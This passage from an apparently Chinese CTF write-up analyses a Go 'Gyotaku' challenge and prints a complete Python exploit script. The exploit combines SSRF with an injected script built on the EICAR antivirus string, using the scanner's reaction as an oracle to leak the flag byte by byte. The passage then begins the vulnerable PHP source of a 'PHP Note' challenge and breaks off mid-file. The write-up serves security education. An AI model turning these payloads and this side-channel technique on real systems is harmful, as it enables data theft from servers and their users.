class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">resp, err := http.Get(url)</span><br><span class="line"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> err</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> err</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// save gyotaku</span></span><br><span class="line">gyotakudata := &amp;GyotakuData{</span><br><span class="line">  URL:      url,</span><br><span class="line">  Data:     <span class="hljs-keyword">string</span>(body),</span><br><span class="line">  UserName: username,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">buf := bytes.NewBuffer(<span class="hljs-literal">nil</span>)</span><br><span class="line">err = gob.NewEncoder(buf).Encode(gyotakudata)</span><br><span class="line"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> err</span><br><span class="line">}</span><br><span class="line">err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), <span class="hljs-number">0644</span>)</span><br><span class="line"><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> err</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这段将<code>GyotakuData</code>写入了一个文件当中，并且跟我们上文提到的写文件方法一致，判断了是否写入成功，不成功就返回<code>err</code>，并且在这里三个写入的参数我们都可控。</p><p>所以我们现在可以有一个大致思路，通过提交<code>{"url":"http://127.0.0.1/flag"}</code>到<code>/gyotaku</code>路由，构成一个 SSRF ，这时候<code>/flag</code>路由会返回 flag ，通过以上代码解析，flag 被放到了<code>Data</code>中，接着我们再看一下<code>GyotakuData</code>结构体</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">type</span> GyotakuData <span class="hljs-keyword">struct</span> {</span><br><span class="line">trueURL      <span class="hljs-keyword">string</span> <span class="hljs-string">`json:"url"`</span></span><br><span class="line">trueData     <span class="hljs-keyword">string</span> <span class="hljs-string">`json:"data"`</span></span><br><span class="line">trueUserName <span class="hljs-keyword">string</span> <span class="hljs-string">`json:"username"`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果中间是<code>Data</code>是我们<code>&lt;body&gt;</code>标签的 secret 数据，那么<code>UserName</code>我们就需要一个<code>&lt;/body&gt;</code>标签将其闭合，前面 URL 怎么构造好呢？</p><p>因为<code>/flag</code>路由是不处理任何 GET 参数的，所以我们可以尝试把我们需要构造的 payload 放到 URL 参数当中，这样就可以构造了我们上文的 Payload 了，我们需要构造的大致就是以下这样：</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">type</span> GyotakuData <span class="hljs-keyword">struct</span> {</span><br><span class="line">  URL      <span class="hljs-keyword">string</span> <span class="hljs-string">"http://127.0.0.1/flag?&lt;script&gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H' + {[num] : '*'}[Math.min(num ,body)];eval(mal);&lt;/script&gt;&lt;body&gt;"</span></span><br><span class="line">  Data     <span class="hljs-keyword">string</span> <span class="hljs-string">"flag{test}"</span></span><br><span class="line">trueUserName <span class="hljs-keyword">string</span> <span class="hljs-string">"&lt;/body&gt;"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样服务把<code>GyotakuData</code>结构体写入文件当中了:</p><p></p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">...GyotakuData...URL...Data...UserName...http://127.0.0.1/flag?<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript"><span class="hljs-keyword">var</span> num = <span class="hljs-number">90</span>;<span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body.innerHTML[<span class="hljs-number">0</span>].charCodeAt(<span class="hljs-number">0</span>);<span class="hljs-keyword">var</span> mal = <span class="hljs-string">'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H'</span> + </span></span><span class="hljs-template-variable">{[num] : '*'}</span><span class="hljs-xml"><span class="hljs-javascript">[<span class="hljs-built_in">Math</span>.min(num ,body)];<span class="hljs-built_in">eval</span>(mal);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>...</span></span><br><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{test}</span><span class="hljs-xml">...<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>...</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>为了方便阅读，上面我用<code>...</code>代替了不可见字符，可以用以下测试代码进行测试：</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">true<span class="hljs-string">"bytes"</span></span><br><span class="line">true<span class="hljs-string">"encoding/gob"</span></span><br><span class="line">true<span class="hljs-string">"io/ioutil"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">type</span> GyotakuData <span class="hljs-keyword">struct</span> {</span><br><span class="line">trueURL      <span class="hljs-keyword">string</span> <span class="hljs-string">`json:"url"`</span></span><br><span class="line">trueData     <span class="hljs-keyword">string</span> <span class="hljs-string">`json:"data"`</span></span><br><span class="line">trueUserName <span class="hljs-keyword">string</span> <span class="hljs-string">`json:"username"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">trueurl := <span class="hljs-string">"http://127.0.0.1/flag?&lt;script&gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H' + {[num] : '*'}[Math.min(num ,body)];eval(mal);&lt;/script&gt;&lt;body&gt;"</span></span><br><span class="line">truebody := <span class="hljs-string">"flag{test}"</span></span><br><span class="line">trueusername := <span class="hljs-string">"&lt;/body&gt;"</span></span><br><span class="line"></span><br><span class="line">truegyotakudata := &amp;GyotakuData{</span><br><span class="line">truetrueURL:      url,</span><br><span class="line">truetrueData:     body,</span><br><span class="line">truetrueUserName: username,</span><br><span class="line">true}</span><br><span class="line">truebuf := bytes.NewBuffer(<span class="hljs-literal">nil</span>)</span><br><span class="line">truegob.NewEncoder(buf).Encode(gyotakudata)</span><br><span class="line">trueioutil.WriteFile(<span class="hljs-string">"test.txt"</span>, buf.Bytes(), <span class="hljs-number">0644</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样只要我们每次控制 num 的值，我们就可以在服务器 500 的时候判断我们设立的条件是否成立了。这里直接给出 TokyoWesterns 的 exp 脚本，他们使用了二分法加快判断：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="hljs-string">"http://192.168.122.78"</span> <span class="hljs-comment"># changeme</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randstr</span><span class="hljs-params">(n=<span class="hljs-number">8</span>)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">import</span> random</span><br><span class="line">    <span class="hljs-keyword">import</span> string</span><br><span class="line">    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([random.choice(chars) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(n)])</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trigger</span><span class="hljs-params">(c, idx, sess)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">import</span> string</span><br><span class="line">    prefix = randstr()</span><br><span class="line">    p = prefix + <span class="hljs-string">'''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">    p = string.Template(p).substitute({<span class="hljs-string">'idx'</span>: idx, <span class="hljs-string">'c'</span>: c})</span><br><span class="line">    req = sess.post(URL + <span class="hljs-string">'/gyotaku'</span>, data={<span class="hljs-string">'url'</span>: <span class="hljs-string">'http://127.0.0.1/flag?a='</span> + p})</span><br><span class="line">    <span class="hljs-keyword">return</span> req.json()</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(idx, sess)</span>:</span></span><br><span class="line">    l, h = <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span></span><br><span class="line">    <span class="hljs-keyword">while</span> h - l &gt; <span class="hljs-number">1</span>:</span><br><span class="line">        m = (h + l) // <span class="hljs-number">2</span></span><br><span class="line">        gid = trigger(m, idx, sess)</span><br><span class="line">        <span class="hljs-keyword">if</span> sess.get(URL + <span class="hljs-string">'/gyotaku/'</span> + gid).status_code == <span class="hljs-number">500</span>:</span><br><span class="line">            l = m</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            h = m</span><br><span class="line">    <span class="hljs-keyword">return</span> chr(l)</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.post(URL + <span class="hljs-string">'/login'</span>, data={<span class="hljs-string">'username'</span>: <span class="hljs-string">'&lt;/body&gt;'</span>+randstr(), <span class="hljs-string">'password'</span>: randstr()})</span><br><span class="line"></span><br><span class="line">data = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):</span><br><span class="line">    data += leak(i, sess)</span><br><span class="line">    print(data)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里<code>trigger</code>函数中 idx 就是获取的<code>&lt;body&gt;</code>标签中的第几位，c 就是我们传入的用于比较的 ascii 码值。至此，这题就分析完毕了。</p><h2 id="PHP-Note"><a href="#PHP-Note" class="headerlink" title="PHP Note"></a>PHP Note</h2><p>在 TokyoWesterns CTF 2019 上，由于 WCTF 2019 上的失误，让他们又出了一道与之相关的题目。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Note</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($admin)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;notes = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;isadmin = $admin;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addnote</span><span class="hljs-params">($title, $body)</span> </span>{</span><br><span class="line">        array_push(<span class="hljs-keyword">$this</span>-&gt;notes, [$title, $body]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getnotes</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;notes;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;isadmin === <span class="hljs-keyword">true</span>) {</span><br><span class="line">            <span class="hljs-keyword">echo</span> FLAG;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($data, $hmac)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> hash_equals(hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret), $hmac);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hmac</span><span class="hljs-params">($data)</span> </span>{</span><br><span class="line">    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($data) || <span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_secret</span><span class="hljs-params">($seed)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> md5(SALT . $seed . PEPPER);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_login</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> !<span class="hljs-keyword">empty</span>($_SESSION[<span class="hljs-string">'secret'</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">redirect</span><span class="hljs-params">($action)</span> </span>{</span><br><span class="line">    header(<span class="hljs-string">"Location: /?action=$action"</span>);</span><br><span class="line">    <span class="hljs-keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$method = $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>];</span><br><span class="line">$action = $_GET[<span class="hljs-string">'action'</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!in_array($action, [<span class="hljs-string">'index'</span>, <span class="hljs-string">'login'</span>, <span class="hljs-string">'logout'</span>, <span class="hljs-string">'post'</span>, <span class="hljs-string">'source'</span>, <span class="hljs-string">'getflag'</span>])) {</span><br><span class="line">    redirect(<span class="hljs-string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'source'</span>) {</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">    <span class="hljs-keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (is_login()) {</span><br><span class="line">    $realname = $_SESSION[<span class="hljs-string">'realname'</span>];</span><br><span class="line">    $nickname = $_SESSION[<span class="hljs-string">'nickname'</span>];</span><br><span class="line">    </span><br><span class="line">    $note = verify($_COOKIE[<span class="hljs-string">'note'</span>], $_COOKIE[<span class="hljs-string">'hmac'</span>])</span><br><span class="line">            ? unserialize(base64_decode($_COOKIE[<span class="hljs-string">'note'</span>]))</span><br><span class="line">            : <span class="hljs-keyword">new</span> Note(<span class="hljs-keyword">false</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'login'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ($method === <span class="hljs-string">'POST'</span>) {</span><br><span class="line">        $nickname = (string)$_POST[<span class="hljs-string">'nickname'</span>];</span><br><span class="line">        $realname = (string)$_POST[<span class="hljs-string">'realname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($realname) || strlen($realname) &lt; <span class="hljs-number">8</span>) {</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">'invalid name'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $_SESSION[<span class="hljs-string">'realname'</span>] = $realname;</span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($nickname)) {</span><br><span class="line">            $_SESSION[<span class="hljs-string">'nickname'</span>] = $nickname;</span><br><span class="line">        }</span><br><span class="line">        $_SESSION[<span class="hljs-string">'secret'</span>] = gen_secret($nickname);</span><br><span class="line">    }</span><br><span class="line">    redirect(<span class="hljs-string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'logout'</span>) {</span><br><span class="line">    session_destroy();</span><br><span class="line">    redirect(<span class="hljs-string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'post'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ($method === <span class="hljs-string">'POST'</span>) {</span><br><span class="line">        $title = (string)$_POST[<span class="hljs-string">'title'</span>];</span><br><span class="line">        $body = (string)$_POST[<span class="hljs-string">'body'</span>];</span><br><span class="line">        $note-&gt;addnote($title, $body);</span><br><span class="line">        $data = base64_encode(serialize($note));</span><br><span class="line">        setcookie(<span class="hljs-string">'note'</span>, (string)$data);</span><br><span class="line">        setcookie(<span class="hljs-string">'hmac'</span>, (string)hmac($data));</span><br><span class="line">    }</span><br><span class="line">    redirect(<span class="hljs-string">'index'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'getflag'</span>) {</span><br><span class="line">    $note-&gt;getflag();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;PHP note&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        textarea {</span><br><span class="line">            resize: none;</span><br><span class="line">            width: <span class="hljs-number">300</span>px;</span><br><span class="line">            height: <span class="hljs-number">200</span>px;</span><br><span class="line">        }</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (!is_login()) {</span><br><span class="line">            $realname = htmlspecialchars($realname);</span><br><span class="line">            $nickname = htmlspecialchars($nickname);</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;form action=<span class="hljs-string">"/?action=login"</span> method=<span class="hljs-string">"post"</span> id=<span class="hljs-string">"login"</span>&gt;</span><br><span class="line">            &lt;input type=<span class="hljs-string">"text"</span> id=<span class="hljs-string">"firstname"</span> placeholder=<span class="hljs-string">"First Name"</span>&gt;</span><br><span class="line">            &lt;input type=<span class="hljs-string">"text"</span> id=<span class="hljs-string">"lastname"</span> placeholder=<span class="hljs-string">"Last Name"</span>&gt;</span><br><span class="line">            &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"nickname"</span> id=<span class="hljs-string">"nickname"</span> placeholder=<span class="hljs-string">"nickname"</span>&gt;</span><br><span class="line">            &lt;input type=<span class="hljs-string">"hidden"</span> name=<span class="hljs-string">"realname"</span> id=<span class="hljs-string">"realname"</span>&gt;</span><br><span class="line">            &lt;button type=<span class="hljs-string">"submit"</span>&gt;Login&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;h1&gt;Welcome, <span class="hljs-meta">&lt;?</span>=$realname<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>= !<span class="hljs-keyword">empty</span>($nickname) ? <span class="hljs-string">" ($nickname)"</span> : <span class="hljs-string">""</span> <span class="hljs-meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">        &lt;a href=<span class="hljs-string">"/?action=logout"</span>&gt;logout&lt;/a&gt;</span><br><span class="line">        &lt;!-- &lt;a href=<span class="hljs-string">"/?action=source"</span>&gt;source&lt;/a&gt; --&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line">            <span class="hljs-keyword">foreach</span>($note-&gt;getnotes() <span class="hljs-keyword">as</span> $k =&gt; $v) {</span><br><span class="line">                <span class="hljs-keyword">list</span>($title, $body) = $v;</span><br><span class="line">                $title = htmlspecialchars($title);</span><br><span class="line">                $body = htmlspecialchars($body);</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;h2&gt;<span class="hljs-meta">&lt;?</span>=$title<span class="hljs-meta">?&gt;</span>&lt;/h2&gt;</span><br><span class="line">        &lt;p&gt;<span class="hljs-meta">&lt;?</span>=$body<span class="hljs-meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line">            }</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;form action=<span class="hljs-string">"/?action=post"</span> method=<span class="hljs-string">"post"</span>&gt;</span><br><span class="line">            &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"title"</span> placeholder=<span class="hljs-string">"title"</span>&gt;</span><br><span class="line">            &lt;br&gt;</span><br><span class="line">            &lt;textarea name=<span class="hljs-string">"body"</span> placeholder=<span class="hljs-string">"body"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">            &lt;button type=<span class="hljs-string">"submit"</span>&gt;Post&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">        <span class="hljs-meta">&lt;?php</span></span><br><span class="line">        <span class="hljs-meta">?&gt;</span></span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            